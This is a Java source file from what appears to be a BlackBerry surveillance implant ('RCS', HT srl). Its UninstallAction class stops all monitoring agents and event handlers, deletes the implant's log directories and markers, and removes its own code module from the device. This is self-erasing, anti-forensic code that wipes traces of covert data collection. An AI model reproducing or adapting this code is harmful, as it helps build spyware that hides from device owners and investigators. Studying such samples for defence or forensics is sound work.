/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : UninstallAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;
import blackberry.AgentManager;
import blackberry.EventManager;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.log.Markup;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class UninstallAction.
 */
public final class UninstallAction extends SubAction {

    /**
     * Instantiates a new uninstall action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public UninstallAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);

        // #ifdef DBC
        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
        // #endif
    }

    /**
     * Instantiates a new uninstall action.
     * 
     * @param host
     *            the host
     */
    public UninstallAction(final String host) {
        super(ACTION_UNINSTALL);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        // #debug info
        debug.info("execute");

        wantUninstall = true;

        AgentManager.getInstance().stopAll();
        EventManager.getInstance().stopAll();

        LogCollector.getInstance().removeLogDirs();
        Markup.removeMarkups();

        final ApplicationDescriptor ad = ApplicationDescriptor
                .currentApplicationDescriptor();
        final int moduleHandle = ad.getModuleHandle();
        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
        //final String errorString = Integer.toString(rc);
        //#debug info
        debug.info("deleteModuleEx result: " + rc);
        switch (rc) {
        case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
            // #debug info
            debug.info("Will be deleted on restart");
            // Device.requestPowerOff( true );
            break;
        case CodeModuleManager.CMM_MODULE_IN_USE:
        case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
            // #debug info
            debug.info("Module In Use");
            break;
        case CodeModuleManager.CMM_HANDLE_INVALID:
            // #debug
            debug.error("Invalid Handle");
            break;
        case CodeModuleManager.CMM_MODULE_REQUIRED:
            // #debug
            debug.error("Module Required");
            break;
        default:
            // #debug
            debug.error(Integer.toString(rc));
            return false;
        }
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        //#ifdef DBC
        Check.requires(confParams.length == 0, "params should be empty");
        //#endif
        return true;
    }

}
